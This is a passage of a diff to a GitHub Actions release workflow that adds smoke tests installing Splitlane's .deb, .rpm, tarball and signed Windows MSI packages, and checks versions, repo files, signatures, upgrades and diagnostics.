+          # Simulate a user with a custom mirror already configured.
+          # Reinstalling the package must NOT clobber their file.
+          custom='deb [trusted=yes] https://mirror.example.com/splitlane stable main'
+          echo "$custom" > /etc/apt/sources.list.d/splitlane.list
+          apt-get install --reinstall -y --no-install-recommends \
+            ./release-assets/splitlane-*.deb
+          grep -Fxq "$custom" /etc/apt/sources.list.d/splitlane.list \
+            || { echo "::error::postinst overwrote a pre-existing splitlane.list"; exit 1; }
+
+  smoke-test-fedora:
+    name: Smoke test - Fedora 40 (.rpm postinst)
+    needs: build
+    runs-on: ubuntu-22.04
+    container: fedora:40
+    # fedora:40 ships bash as /bin/sh already, but pin it explicitly
+    # here too - keeps the smoke jobs uniform and survives a future
+    # base-image swap (e.g., fedora:41+ or a minimal variant) without
+    # silently regressing pipefail support.
+    defaults:
+      run:
+        shell: bash
+    steps:
+      - name: Download built .rpm
+        uses: actions/download-artifact@v4
+        with:
+          # See the deb smoke test for the same naming rationale.
+          name: release-assets-x86_64-Linux
+          path: ./release-assets
+
+      - name: Install splitlane.rpm (exercises %post scriptlet)
+        # `--allowerasing` handles minimal-image edge cases where a dep
+        # conflicts with a pre-installed placeholder; safe in CI because
+        # the clean container has no user data to erase.
+        run: |
+          set -euo pipefail
+          dnf install -y --allowerasing ./release-assets/splitlane-*.rpm
+
+      - name: Assert %post wrote no dnf repo file
+        # The inverse of the assertion that stood here until the rename;
+        # see the .deb leg above and packaging/rpm/postinst.sh.
+        run: |
+          set -euo pipefail
+          # Both names, for the reason spelled out on the .deb leg.
+          ! ls /etc/yum.repos.d/ | grep -qiE 'paneflow|splitlane'
+
+      - name: Assert `dnf check-update splitlane` does not hard-fail
+        # Same Cursor-regression check as the apt smoke test: whatever the
+        # %post scriptlet did, dnf must still function afterwards.
+        run: |
+          set -euo pipefail
+          dnf check-update splitlane || true
+          dnf list installed splitlane
+
+      - name: Idempotency - pre-existing splitlane.repo is not overwritten
+        run: |
+          set -euo pipefail
+          # Write a pre-existing .repo file pointing at a dummy mirror;
+          # verify the %post scriptlet leaves it alone on reinstall.
+          # Single-line cat heredoc keeps the YAML block-scalar indent
+          # contract intact (YAML requires every non-empty line to be
+          # indented ≥ the first line; a multi-line shell variable with
+          # column-0 continuations would violate that).
+          cat > /etc/yum.repos.d/splitlane.repo <<'CUSTOMEOF'
+          [splitlane]
+          name=Splitlane (custom mirror)
+          baseurl=https://mirror.example.com/splitlane
+          enabled=1
+          gpgcheck=0
+          CUSTOMEOF
+          dnf reinstall -y --allowerasing ./release-assets/splitlane-*.rpm
+          grep -Fq 'Splitlane (custom mirror)' /etc/yum.repos.d/splitlane.repo \
+            || { echo "::error::%post overwrote a pre-existing splitlane.repo"; exit 1; }
+
+  # ─── Debian 12 (.deb postinst) ──────────────────────────────────────
+  # Same .deb the Ubuntu smoke test installs, but on Debian's older
+  # apt + glibc baseline. Catches Ubuntu-only assumptions in our
+  # postinst (e.g. `apt-get` flag drift, snap-aware codepaths).
+  smoke-test-debian:
+    name: Smoke test - Debian 12 (.deb postinst)
+    needs: build
+    runs-on: ubuntu-22.04
+    container: debian:bookworm-slim
+    defaults:
+      run:
+        shell: bash
+    steps:
+      - name: Install baseline tools (retry on transient mirror flake)
+        env:
+          DEBIAN_FRONTEND: noninteractive
+        # `bookworm-slim` ships dash as /bin/sh and a stripped APT
+        # cache, so a fresh `apt-get update` is mandatory before the
+        # .deb install can resolve `ca-certificates` and runtime deps. Wrap
+        # in a 3-attempt loop because deb.debian.org occasionally
+        # returns 503 on the first hit from a fresh container IP.
+        run: |
+          set -euo pipefail
+          for attempt in 1 2 3; do
+            if apt-get update -qq && apt-get install -y --no-install-recommends \
+                 ca-certificates; then
+              break
+            fi
+            echo "::warning::apt-get baseline install failed, retry ${attempt}/3"
+            [ "${attempt}" -lt 3 ] && sleep 5
+          done
+
+      - name: Download built .deb
+        uses: actions/download-artifact@v4
+        with:
+          name: release-assets-x86_64-Linux
+          path: ./release-assets
+
+      - name: Install splitlane.deb (exercises postinst on Debian 12)
+        env:
+          DEBIAN_FRONTEND: noninteractive
+        run: |
+          set -euo pipefail
+          for attempt in 1 2 3; do
+            if apt-get install -y --no-install-recommends \
+                 ./release-assets/splitlane-*.deb; then
+              break
+            fi
+            echo "::warning::splitlane.deb install failed, retry ${attempt}/3"
+            [ "${attempt}" -lt 3 ] && sleep 5
+          done
+
+      - name: Assert splitlane --version matches the released tag
+        env:
+          TAG: ${{ env.RELEASE_TAG }}
+        run: |
+          set -euo pipefail
+          version="${TAG#v}"
+          actual="$(splitlane --version)"
+          expected="splitlane ${version}"
+          if [ "${actual}" != "${expected}" ]; then
+            echo "::error::splitlane --version returned '${actual}', expected '${expected}'"
+            exit 1
+          fi
+
+      - name: Assert postinst wrote splitlane.list (Debian path)
+        run: |
+          set -euo pipefail
+          test -f /etc/apt/sources.list.d/splitlane.list
+
+  # ─── openSUSE Tumbleweed (.rpm via zypper) ──────────────────────────
+  # Validates that our cargo-generate-rpm `Requires:` (vulkan-loader,
+  # libxkbcommon, libxkbcommon-x11, fontconfig, freetype) resolves on
+  # zypper's package graph too - not only dnf's. A naming-drift
+  # failure here means the .rpm needs a `Provides:`-aware fix before
+  # we can claim openSUSE coverage.
+  smoke-test-opensuse:
+    name: Smoke test - openSUSE Tumbleweed (.rpm postinst)
+    needs: build
+    runs-on: ubuntu-22.04
+    container: opensuse/tumbleweed
+    defaults:
+      run:
+        shell: bash
+    steps:
+      - name: Refresh zypper repos (retry on transient mirror flake)
+        # Tumbleweed's container image ships with stale repo metadata
+        # roughly half the time; refresh once, retry on flake. The OSS
+        # repo also serves a large AppStream metadata blob that can exceed
+        # libzypp's default transfer timeout from GitHub-hosted runners.
+        run: |
+          set -euo pipefail
+          mkdir -p /etc/zypp
+          touch /etc/zypp/zypp.conf
+          sed -i \
+            -e 's/^#\?[[:space:]]*download.connect_timeout.*/download.connect_timeout = 120/' \
+            -e 's/^#\?[[:space:]]*download.transfer_timeout.*/download.transfer_timeout = 600/' \
+            /etc/zypp/zypp.conf
+          grep -q '^download.connect_timeout = 120' /etc/zypp/zypp.conf || \
+            echo 'download.connect_timeout = 120' >> /etc/zypp/zypp.conf
+          grep -q '^download.transfer_timeout = 600' /etc/zypp/zypp.conf || \
+            echo 'download.transfer_timeout = 600' >> /etc/zypp/zypp.conf
+          for attempt in 1 2 3; do
+            if zypper --non-interactive --gpg-auto-import-keys refresh; then
+              break
+            fi
+            echo "::warning::zypper refresh failed, retry ${attempt}/3"
+            [ "${attempt}" -lt 3 ] && sleep 5
+          done
+
+      - name: Download built .rpm
+        uses: actions/download-artifact@v4
+        with:
+          name: release-assets-x86_64-Linux
+          path: ./release-assets
+
+      - name: Install splitlane.rpm via zypper
+        # `--no-gpg-checks` (NOT `--allow-unsigned-rpm`): the build
+        # job signs the .rpm with `rpmsign --addsign` (release.yml
+        # line ~474), so the artifact is SIGNED but with a key that
+        # the Tumbleweed container's keyring does not trust.
+        # `--allow-unsigned-rpm` only skips the check for UNSIGNED
+        # rpms; on a signed-but-unknown-key rpm it still aborts
+        # with `Signature verification failed [4-Signatures public
+        # key is not available]`. `--no-gpg-checks` covers both
+        # cases. The smoke test's purpose is install+postinst
+        # correctness, not signature validation - which is the
+        # job of the Phase-1 sha256 sidecar emitted by the build
+        # job.
+        run: |
+          set -euo pipefail
+          for attempt in 1 2 3; do
+            if zypper --non-interactive --no-gpg-checks install \
+                 --allow-unsigned-rpm \
+                 ./release-assets/splitlane-*.rpm; then
+              break
+            fi
+            echo "::warning::zypper install failed, retry ${attempt}/3"
+            [ "${attempt}" -lt 3 ] && sleep 5
+          done
+
+      - name: Assert splitlane --version matches the released tag
+        env:
+          TAG: ${{ env.RELEASE_TAG }}
+        run: |
+          set -euo pipefail
+          version="${TAG#v}"
+          actual="$(splitlane --version)"
+          expected="splitlane ${version}"
+          if [ "${actual}" != "${expected}" ]; then
+            echo "::error::splitlane --version returned '${actual}', expected '${expected}'"
+            exit 1
+          fi
+
+      - name: Assert %post wrote splitlane.repo
+        # openSUSE uses /etc/zypp/repos.d/ (not yum.repos.d/) - the
+        # postinst.sh writes to whichever distro-canonical directory
+        # exists, so on Tumbleweed this is the correct expected path.
+        run: |
+          set -euo pipefail
+          test -f /etc/zypp/repos.d/splitlane.repo
+          grep -Fq '[splitlane]' /etc/zypp/repos.d/splitlane.repo
+
+  # ─── Arch Linux (tar.gz, no native PKGBUILD) ────────────────────────
+  # Splitlane has no AUR maintainer yet, so this leg installs the
+  # platform-agnostic tarball produced by `scripts/bundle-tarball.sh`
+  # (Zed-style `splitlane.app/bin/splitlane` layout) into a clean
+  # `archlinux:base` container. The runtime libs are installed
+  # ahead of time via pacman because the tar.gz carries no dep
+  # metadata; missing names here would surface as the same
+  # `error while loading shared libraries: libvulkan.so.1` the in-app
+  # updater would emit on a real user's box. The .deb / .rpm legs
+  # don't catch this because their package managers resolve those
+  # libs implicitly from `Requires:` / `depends:`.
+  smoke-test-arch:
+    name: Smoke test - Arch Linux (tar.gz binary, no native PKGBUILD)
+    needs: build
+    runs-on: ubuntu-22.04
+    container: archlinux:base
+    defaults:
+      run:
+        shell: bash
+    steps:
+      - name: Install runtime libs (tar.gz has no dep metadata)
+        # Mirror the .deb / .rpm `Requires:` set, mapped to Arch
+        # package names. Pinning to a specific Arch snapshot is not
+        # worth it: the smoke test's job is precisely to fail when
+        # rolling-Arch ships a SO-name bump that breaks our
+        # ubuntu-22.04 build target.
+        run: |
+          set -euo pipefail
+          for attempt in 1 2 3; do
+            if pacman -Sy --noconfirm --needed \
+                 glibc libxcb libxkbcommon libxkbcommon-x11 libx11 \
+                 vulkan-icd-loader fontconfig freetype2; then
+              break
+            fi
+            echo "::warning::pacman install failed, retry ${attempt}/3"
+            [ "${attempt}" -lt 3 ] && sleep 5
+          done
+
+      - name: Download tar.gz tarball
+        uses: actions/download-artifact@v4
+        with:
+          name: release-assets-x86_64-Linux
+          path: ./release-assets
+
+      - name: Extract splitlane.app/ and assert --version matches the tag
+        env:
+          TAG: ${{ env.RELEASE_TAG }}
+        # Tarball layout (scripts/bundle-tarball.sh): `splitlane.app/`
+        # at the root, binary at `splitlane.app/bin/splitlane`. We
+        # `find` the binary instead of hardcoding the path so a
+        # future bundle-layout shift doesn't silently mask a smoke
+        # regression.
+        run: |
+          set -euo pipefail
+          version="${TAG#v}"
+          mkdir -p /opt/splitlane-smoke
+          tar -xzf release-assets/splitlane-*.tar.gz -C /opt/splitlane-smoke
+          splitlane_bin="$(find /opt/splitlane-smoke -type f -name splitlane -executable | head -n1)"
+          if [ -z "${splitlane_bin}" ]; then
+            echo "::error::splitlane binary not found in tar.gz layout"
+            ls -laR /opt/splitlane-smoke
+            exit 1
+          fi
+          actual="$("${splitlane_bin}" --version)"
+          expected="splitlane ${version}"
+          if [ "${actual}" != "${expected}" ]; then
+            echo "::error::splitlane --version returned '${actual}', expected '${expected}'"
+            exit 1
+          fi
+
+  # ─── Windows MSI smoke: signed installer + update relay ──────────────
+  # This is the Windows counterpart to the Linux package smokes above.
+  # CI cannot click through a real UAC consent prompt, so the job keeps
+  # the elevated path for manual release smoke. What it does gate here is
+  # the release artifact that users receive: signed MSI integrity, silent
+  # Windows Installer install/uninstall, the installed `splitlane --version`,
+  # and the detached `--msi-relay` path that waits, invokes msiexec, writes
+  # diagnostics, removes its staged MSI, and requests a relaunch.
+  smoke-test-windows-msi:
+    name: Smoke test - Windows MSI install + relay
+    needs: build
+    runs-on: windows-2022
+    defaults:
+      run:
+        shell: pwsh
+    steps:
+      - uses: actions/checkout@v5
+        with:
+          ref: ${{ env.RELEASE_REF }}
+
+      - name: Download signed Windows MSI
+        uses: actions/download-artifact@v4
+        with:
+          name: release-assets-x86_64-Windows
+          path: ./release-assets
+
+      - name: Download pinned v0.8.0 Alacritty-only MSI baseline
+        env:
+          GH_TOKEN: ${{ github.token }}
+          BASELINE_DIR: ${{ runner.temp }}\splitlane-msi-baseline
+        run: |
+          New-Item -ItemType Directory -Force -Path $env:BASELINE_DIR | Out-Null
+          gh release download v0.8.0 `
+            --repo $env:GITHUB_REPOSITORY `
+            --pattern 'splitlane-0.8.0-x86_64-pc-windows-msvc.msi' `
+            --pattern 'splitlane-0.8.0-x86_64-pc-windows-msvc.msi.sha256' `
+            --dir $env:BASELINE_DIR
+          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+
+      - name: Upgrade MSI, verify compliance, and exercise update relay
+        env:
+          TAG: ${{ env.RELEASE_TAG }}
+          MSI_VERSION: ${{ env.WINDOWS_MSI_VERSION }}
+          SMOKE_DIR: ${{ runner.temp }}\splitlane-msi-smoke
+          BASELINE_DIR: ${{ runner.temp }}\splitlane-msi-baseline
+        run: |
+          $ErrorActionPreference = 'Stop'
+
+          New-Item -ItemType Directory -Force -Path $env:SMOKE_DIR | Out-Null
+          $version = $env:TAG.TrimStart('v')
+          $msiVersion = $env:MSI_VERSION.TrimStart('v')
+          if ($env:RELEASE_MODE -eq 'release' -and $msiVersion -ne $version) {
+              throw "Published MSI ProductVersion '$msiVersion' must match release version '$version'"
+          }
+          if ($msiVersion -notmatch '^\d+\.\d+\.\d+(?:-[0-9A-Za-z]+(?:[.-][0-9A-Za-z]+)*)?(?:\+[0-9A-Za-z]+(?:[.-][0-9A-Za-z]+)*)?$') {
+              throw "Windows MSI upgrade smoke requires a valid semver, got '$msiVersion'"
+          }
+          if ($msiVersion -match '^\d+\.\d+\.\d+$' -and [version]$msiVersion -le [version]'0.8.0') {
+              throw "Windows MSI upgrade smoke requires an MSI ProductVersion newer than the pinned v0.8.0 baseline, got '$msiVersion'"
+          }
+
+          $msis = @(Get-ChildItem -LiteralPath 'release-assets' -Filter 'splitlane-*-x86_64-pc-windows-msvc.msi' -File)
+          if ($msis.Count -ne 1) {
+              $found = $msis | Sort-Object Name | ForEach-Object { $_.Name }
+              throw "Expected exactly one Windows MSI, found $($msis.Count): $($found -join ', ')"
+          }
+          $msi = $msis[0]
+          if ($msi.Length -le 0) {
+              throw "MSI is empty: $($msi.FullName)"
+          }
+
+          $baselineMsis = @(Get-ChildItem -LiteralPath $env:BASELINE_DIR -Filter 'splitlane-0.8.0-x86_64-pc-windows-msvc.msi' -File)
+          if ($baselineMsis.Count -ne 1) {
+              throw "Expected exactly one pinned v0.8.0 MSI, found $($baselineMsis.Count)"
+          }
+          $baselineMsi = $baselineMsis[0]
+
+          $publisherSource = Get-Content -LiteralPath 'src-app/src/update/windows/msi.rs' -Raw
+          $publisherMatch = [regex]::Match(
+              $publisherSource,
+              'const\s+WINDOWS_PUBLISHER_ORGANIZATION:\s*&str\s*=\s*"([^"]+)";'
+          )
+          if (-not $publisherMatch.Success) {
+              throw 'Could not read WINDOWS_PUBLISHER_ORGANIZATION from src-app/src/update/windows/msi.rs'
+          }
+          $expectedPublisher = $publisherMatch.Groups[1].Value
+
+          function Assert-Sha256Sidecar {
+              param(
+                  [Parameter(Mandatory = $true)][string] $Path,
+                  [Parameter(Mandatory = $true)][string] $Sidecar,
+                  [Parameter(Mandatory = $true)][string] $Label
+              )
+
+              if (-not (Test-Path -LiteralPath $Sidecar -PathType Leaf)) {
+                  throw "$Label is missing SHA-256 sidecar: $Sidecar"
+              }
+              $expectedHash = ((Get-Content -LiteralPath $Sidecar -Raw).Trim() -split '\s+')[0].ToLowerInvariant()
+              if ($expectedHash -notmatch '^[a-f0-9]{64}$') {
+                  throw "$Label has invalid SHA-256 sidecar content in $Sidecar"
+              }
+              $actualHash = (Get-FileHash -Algorithm SHA256 -LiteralPath $Path).Hash.ToLowerInvariant()
+              if ($actualHash -ne $expectedHash) {
+                  throw "$Label SHA-256 mismatch: expected $expectedHash, got $actualHash"
+              }
+          }
+
+          function Assert-MsiTrust {
+              param(
+                  [Parameter(Mandatory = $true)][System.IO.FileInfo] $Msi,
+                  [Parameter(Mandatory = $true)][string] $Publisher,
+                  [Parameter(Mandatory = $true)][string] $Label
+              )
+
+              Assert-Sha256Sidecar -Path $Msi.FullName -Sidecar "$($Msi.FullName).sha256" -Label $Label
+              $signature = Get-AuthenticodeSignature -LiteralPath $Msi.FullName
+              if ($signature.Status -ne 'Valid' -or $null -eq $signature.SignerCertificate) {
+                  throw "$Label Authenticode signature is $($signature.Status): $($signature.StatusMessage)"
+              }
+              $publisherPattern = "(?:^|,\s*)O=$([regex]::Escape($Publisher))(?:,|$)"
+              if ($signature.SignerCertificate.Subject -notmatch $publisherPattern) {
+                  throw "$Label publisher mismatch: expected O=$Publisher, got $($signature.SignerCertificate.Subject)"
+              }
+              Write-Host "$Label signed by $($signature.SignerCertificate.Subject)"
+          }
+
+          Assert-MsiTrust -Msi $baselineMsi -Publisher $expectedPublisher -Label 'Pinned v0.8.0 MSI'
+          Assert-MsiTrust -Msi $msi -Publisher $expectedPublisher -Label 'Candidate MSI'
+
+          $releaseReports = @(Get-ChildItem -LiteralPath 'release-assets' -Filter 'splitlane-*.libghostty-provenance.json' -File)
+          if ($releaseReports.Count -ne 1) {
+              throw "Expected exactly one Windows libghostty provenance report, found $($releaseReports.Count)"
+          }
+          $releaseReportFile = $releaseReports[0]
+          Assert-Sha256Sidecar `
+              -Path $releaseReportFile.FullName `
+              -Sidecar "$($releaseReportFile.FullName).sha256" `
+              -Label 'Windows libghostty provenance report'
+          $releaseReportText = Get-Content -LiteralPath $releaseReportFile.FullName -Raw
+          if ($releaseReportText -match '(?i)[a-z]:\\') {
+              throw 'Windows libghostty provenance report contains a runner-local absolute path'
+          }
+          $releaseReport = $releaseReportText | ConvertFrom-Json
+          if ($releaseReport.target -ne 'x86_64-pc-windows-msvc' -or
+              $releaseReport.linkage -ne 'static-candidate' -or
+              $releaseReport.runtime_smoke_verified -ne $false) {
+              throw 'Windows libghostty provenance report has the wrong target or linkage mode'
+          }
+
+          function Show-LogTail {
+              param([Parameter(Mandatory = $true)][string] $Path)
+
+              if (Test-Path -LiteralPath $Path) {
+                  Write-Host "--- tail of $Path ---"
+                  Get-Content -LiteralPath $Path -Tail 160 | ForEach-Object { Write-Host $_ }
+              }
+          }
+
+          function Invoke-SmokeProcess {
+              param(
+                  [Parameter(Mandatory = $true)][string] $FilePath,
+                  [Parameter(Mandatory = $true)][string[]] $Arguments,
+                  [Parameter(Mandatory = $true)][string] $Label,
+                  [int] $TimeoutSeconds = 300,
+                  [int[]] $AllowedExitCodes = @(0)
+              )
+
+              $startInfo = [System.Diagnostics.ProcessStartInfo]::new()
+              $startInfo.FileName = $FilePath
+              $startInfo.UseShellExecute = $false
+              foreach ($argument in $Arguments) {
+                  [void] $startInfo.ArgumentList.Add($argument)
+              }
+
+              $process = [System.Diagnostics.Process]::Start($startInfo)
+              if (-not $process.WaitForExit($TimeoutSeconds * 1000)) {
+                  try {
+                      $process.Kill($true)
+                  } catch {
+                      Write-Warning "Could not kill timed-out process $($process.Id): $_"
+                  }
+                  throw "$Label timed out after $TimeoutSeconds seconds"
+              }
+
+              if ($AllowedExitCodes -notcontains $process.ExitCode) {
+                  throw "$Label exited with $($process.ExitCode)"
+              }
+
+              return $process.ExitCode
+          }
+
+          $complianceSources = [ordered]@{
+              'LICENSE.txt' = 'LICENSE'
+              'THIRD_PARTY_NOTICES.md' = 'native/libghostty/THIRD_PARTY_NOTICES.md'
+              'libghostty-sbom.cdx.json' = 'native/libghostty/sbom.cdx.json'
+              'libghostty-manifest.toml' = 'native/libghostty/manifest.toml'
+              'libghostty-build-info.txt' = 'native/libghostty/prebuilt/x86_64-pc-windows-msvc/build-info.txt'
+          }
+
+          function Assert-NoMsiResidue {
+              param([Parameter(Mandatory = $true)][string] $Label)
+
+              if (-not (Test-Path -LiteralPath $installDir -PathType Container)) {
+                  return
+              }
+              $residue = @(Get-ChildItem -LiteralPath $installDir -Recurse -File -Force |
+                  ForEach-Object { [IO.Path]::GetRelativePath($installDir, $_.FullName) } |
+                  Sort-Object)
+              if ($residue.Count -ne 0) {
+                  throw "$Label left installed files: $($residue -join ', ')"
+              }
+          }
+
+          function Invoke-BackendLaunchSmoke {
+              param(
+                  [Parameter(Mandatory = $true)][string] $Exe,
+                  [Parameter(Mandatory = $true)][ValidateSet('ghostty', 'alacritty')][string] $Backend,
+                  [Parameter(Mandatory = $true)][string] $ExpectedRequested,
+                  [Parameter(Mandatory = $true)][string] $ExpectedEffective
+              )
+
+              $configDir = Join-Path $env:APPDATA 'splitlane'
+              $configPath = Join-Path $configDir 'splitlane.json'
+              New-Item -ItemType Directory -Force -Path $configDir | Out-Null
+              [ordered]@{ terminal = [ordered]@{ backend = $Backend } } |
+                  ConvertTo-Json -Depth 4 |
+                  Set-Content -LiteralPath $configPath -Encoding utf8
+
+              $stdout = Join-Path $env:SMOKE_DIR "backend-$Backend.stdout.log"
+              $stderr = Join-Path $env:SMOKE_DIR "backend-$Backend.stderr.log"
+              $previousRustLog = $env:RUST_LOG
+              $process = $null
+              try {
+                  $env:RUST_LOG = 'splitlane::terminal::backend=info'
+                  $process = Start-Process -FilePath $Exe `
+                      -PassThru `
+                      -RedirectStandardOutput $stdout `
+                      -RedirectStandardError $stderr
+                  Start-Sleep -Seconds 15
+                  if ($process.HasExited) {
+                      throw "Splitlane $Backend launch exited before the backend diagnostic was captured"
+                  }
+              }
+              finally {
+                  if ($null -ne $process -and -not $process.HasExited) {
+                      $process.Kill($true)
+                      $null = $process.WaitForExit(10000)
+                  }
+                  if ($null -eq $previousRustLog) {
+                      Remove-Item Env:RUST_LOG -ErrorAction SilentlyContinue
+                  }
+                  else {
+                      $env:RUST_LOG = $previousRustLog
+                  }
+              }
+
+              $backendLogParts = foreach ($logPath in @($stdout, $stderr)) {
+                  if (Test-Path -LiteralPath $logPath -PathType Leaf) {
+                      Get-Content -LiteralPath $logPath -Raw
+                  }
+              }
+              $backendLog = @($backendLogParts) -join "`n"
+              $expected = "requested=$ExpectedRequested effective=$ExpectedEffective failure_phase=none"
+              if (-not $backendLog.Contains($expected)) {
+                  throw "Splitlane $Backend launch did not emit the expected privacy-safe diagnostic '$expected'"
+              }
+              if ($backendLog -match '(?i)(command=|cwd=|clipboard=|osc_payload=|[a-z]:\\users\\)') {
+                  throw "Splitlane $Backend diagnostic contains a forbidden sensitive field"
+              }
+              if ($Backend -eq 'ghostty') {
+                  foreach ($identity in @(
+                      "ghostty_source_sha=$($releaseReport.source_sha)",
+                      "ghostty_version=$($releaseReport.ghostty_version)"
+                  )) {
+                      if (-not $backendLog.Contains($identity)) {
+                          throw "Splitlane Ghostty launch did not emit runtime identity '$identity'"
+                      }
+                  }
+                  $runtimeEvidencePath = Join-Path $env:SMOKE_DIR 'ghostty-runtime-evidence.json'
+                  [ordered]@{
+                      schema_version = 1
+                      binary_sha256 = (Get-FileHash -LiteralPath $Exe -Algorithm SHA256).Hash.ToLowerInvariant()
+                      requested = $ExpectedRequested
+                      effective = $ExpectedEffective
+                      source_sha = $releaseReport.source_sha
+                      ghostty_version = $releaseReport.ghostty_version
+                      status = 'passed'
+                  } | ConvertTo-Json -Depth 4 | Set-Content -LiteralPath $runtimeEvidencePath -Encoding utf8
+                  return $runtimeEvidencePath
+              }
+              return $null
+          }
+
+          $msiexec = Join-Path $env:WINDIR 'System32\msiexec.exe'
+          $installDir = Join-Path $env:ProgramFiles 'Splitlane'
+          $pwsh = (Get-Command -Name pwsh -ErrorAction Stop).Source
+          $verifier = (Resolve-Path -LiteralPath 'scripts/verify-libghostty-windows.ps1').Path
+          $freshInstallLog = Join-Path $env:SMOKE_DIR 'fresh-install.log'
+          $freshUninstallLog = Join-Path $env:SMOKE_DIR 'fresh-uninstall.log'
+          $baselineInstallLog = Join-Path $env:SMOKE_DIR 'baseline-install.log'
+          $upgradeLog = Join-Path $env:SMOKE_DIR 'upgrade.log'
+          $uninstallLog = Join-Path $env:SMOKE_DIR 'uninstall.log'
+          $installed = $false
+          $uninstallMsi = $baselineMsi.FullName
+
+          $freshInstalled = $false
+          try {
+              try {
+                  Invoke-SmokeProcess `
+                      -FilePath $msiexec `
+                      -Arguments @('/i', $msi.FullName, '/qn', '/norestart', '/l*v', $freshInstallLog) `
+                      -Label 'candidate MSI fresh install'
+              }
+              catch {
+                  Show-LogTail -Path $freshInstallLog
+                  throw
+              }
+              $freshInstalled = $true
+              $freshExe = Join-Path $installDir 'splitlane.exe'
+              $freshVersion = (& $freshExe --version).Trim()
+              if ($LASTEXITCODE -ne 0 -or $freshVersion -ne "splitlane $version") {
+                  throw "Fresh candidate returned '$freshVersion', expected 'splitlane $version'"
+              }
+
+              $freshGhosttyEvidence = Invoke-BackendLaunchSmoke `
+                  -Exe $freshExe `
+                  -Backend 'ghostty' `
+                  -ExpectedRequested 'Ghostty' `
+                  -ExpectedEffective 'ghostty'
+              Invoke-BackendLaunchSmoke `
+                  -Exe $freshExe `
+                  -Backend 'alacritty' `
+                  -ExpectedRequested 'Alacritty' `
+                  -ExpectedEffective 'alacritty'
+
+              $freshReportPath = Join-Path $env:SMOKE_DIR 'fresh-install-libghostty-provenance.json'
+              Invoke-SmokeProcess `
+                  -FilePath $pwsh `
+                  -Arguments @(
+                      '-NoProfile',
+                      '-File', $verifier,
+                      '-Target', 'x86_64-pc-windows-msvc',
+                      '-Binary', $freshExe,
+                      '-PackageRoot', $installDir,
+                      '-RuntimeEvidence', $freshGhosttyEvidence,
+                      '-ReportPath', $freshReportPath,
+                      '-AllowReleaseAssets'
+                  ) `
+                  -Label 'fresh-installed libghostty runtime verifier'
+              $freshReport = Get-Content -LiteralPath $freshReportPath -Raw | ConvertFrom-Json
+              if ($freshReport.linkage -ne 'static' -or
+                  $freshReport.runtime_smoke_verified -ne $true -or
+                  $freshReport.binary_sha256 -ne $releaseReport.binary_sha256) {
+                  throw 'Fresh-installed Splitlane binary did not produce runtime-verified static provenance'
+              }
+          }
+          finally {
+              if ($freshInstalled) {
+                  try {
+                      Invoke-SmokeProcess `
+                          -FilePath $msiexec `
+                          -Arguments @('/x', $msi.FullName, '/qn', '/norestart', '/l*v', $freshUninstallLog) `
+                          -Label 'candidate MSI fresh uninstall'
+                  }
+                  catch {
+                      Show-LogTail -Path $freshUninstallLog
+                      throw
+                  }
+              }
+          }
+          Assert-NoMsiResidue -Label 'Candidate fresh uninstall'
+
+          $configDir = Join-Path $env:APPDATA 'splitlane'
+          $configPath = Join-Path $configDir 'splitlane.json'
+          New-Item -ItemType Directory -Force -Path $configDir | Out-Null
+          [ordered]@{ terminal = [ordered]@{ backend = 'alacritty' } } |
+              ConvertTo-Json -Depth 4 |
+              Set-Content -LiteralPath $configPath -Encoding utf8
+          $configHashBeforeUpgrade = (Get-FileHash -LiteralPath $configPath -Algorithm SHA256).Hash
+
+          try {
+              try {
+                  Invoke-SmokeProcess `
+                      -FilePath $msiexec `
+                      -Arguments @('/i', $baselineMsi.FullName, '/qn', '/norestart', '/l*v', $baselineInstallLog) `
+                      -Label 'pinned v0.8.0 MSI install'
+              } catch {
+                  Show-LogTail -Path $baselineInstallLog
+                  throw
+              }
+              $installed = $true
+              $exe = Join-Path $installDir 'splitlane.exe'
+              if (-not (Test-Path -LiteralPath $exe)) {
+                  throw "Pinned v0.8.0 splitlane.exe not found at $exe"
+              }
+              $baselineActualVersion = (& $exe --version).Trim()
+              if ($LASTEXITCODE -ne 0 -or $baselineActualVersion -ne 'splitlane 0.8.0') {
+                  throw "Pinned baseline returned '$baselineActualVersion', expected 'splitlane 0.8.0'"
+              }
+
+              try {
+                  Invoke-SmokeProcess `
+                      -FilePath $msiexec `
+                      -Arguments @('/i', $msi.FullName, '/qn', '/norestart', '/l*v', $upgradeLog) `
+                      -Label 'candidate MSI upgrade'
+              } catch {
+                  Show-LogTail -Path $upgradeLog
+                  throw
+              }
+              $uninstallMsi = $msi.FullName
+
+              if (-not (Test-Path -LiteralPath $exe)) {
+                  throw "Upgraded splitlane.exe not found at $exe"
+              }
+              $actualVersion = (& $exe --version).Trim()
+              if ($LASTEXITCODE -ne 0) {
+                  throw "splitlane --version exited with $LASTEXITCODE"
+              }
+              $expectedVersion = "splitlane $version"
+              if ($actualVersion -ne $expectedVersion) {
+                  throw "splitlane --version returned '$actualVersion', expected '$expectedVersion'"
+              }
+
+              if (-not (Test-Path -LiteralPath $configPath -PathType Leaf)) {
+                  throw 'MSI upgrade removed the existing Splitlane configuration'
+              }
+              $configHashAfterUpgrade = (Get-FileHash -LiteralPath $configPath -Algorithm SHA256).Hash
+              $preservedConfig = Get-Content -LiteralPath $configPath -Raw | ConvertFrom-Json
+              if ($configHashAfterUpgrade -ne $configHashBeforeUpgrade -or
+                  $preservedConfig.terminal.backend -ne 'alacritty') {
+                  throw 'MSI upgrade did not preserve the explicit Alacritty rollback configuration'
+              }
+
+              foreach ($entry in $complianceSources.GetEnumerator()) {
+                  $installedPath = Join-Path $installDir $entry.Key
+                  if (-not (Test-Path -LiteralPath $installedPath -PathType Leaf)) {
+                      throw "Installed MSI compliance inventory is missing $($entry.Key)"
+                  }
+                  $sourceHash = (Get-FileHash -Algorithm SHA256 -LiteralPath $entry.Value).Hash
+                  $installedHash = (Get-FileHash -Algorithm SHA256 -LiteralPath $installedPath).Hash
+                  if ($installedHash -ne $sourceHash) {
+                      throw "Installed MSI compliance file differs from its release source: $($entry.Key)"
+                  }
+              }
+              $forbiddenDlls = @(Get-ChildItem -LiteralPath $installDir -Recurse -Filter '*ghostty*.dll' -File)
+              if ($forbiddenDlls.Count -ne 0) {
+                  throw "Installed MSI contains forbidden Ghostty DLLs: $(($forbiddenDlls.FullName) -join ', ')"
+              }
+
+              $installedReportPath = Join-Path $env:SMOKE_DIR 'installed-libghostty-provenance.json'
+              Invoke-SmokeProcess `
+                  -FilePath $pwsh `
+                  -Arguments @(
+                      '-NoProfile',
+                      '-File', $verifier,
